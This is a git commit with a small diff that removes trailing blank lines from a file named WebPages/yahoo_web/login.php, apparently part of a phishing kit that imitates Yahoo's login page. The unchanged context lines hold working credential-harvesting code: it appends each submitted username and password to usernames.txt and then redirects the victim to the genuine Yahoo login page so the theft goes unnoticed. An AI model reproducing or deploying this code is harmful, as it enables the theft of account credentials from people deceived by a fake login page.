fffad2f561b2441db9a140fc087bf070fda68c3e
alexmozzhakov <alexey.m@ex.ua>
2018-06-04 10:49:31 +0300

    Removed new lines at the end of file

--- WebPages/yahoo_web/login.php
+++ WebPages/yahoo_web/login.php
@@ -4,5 +4,3 @@ include 'base.php';
 file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://login.yahoo.com');
 exit();
-
-
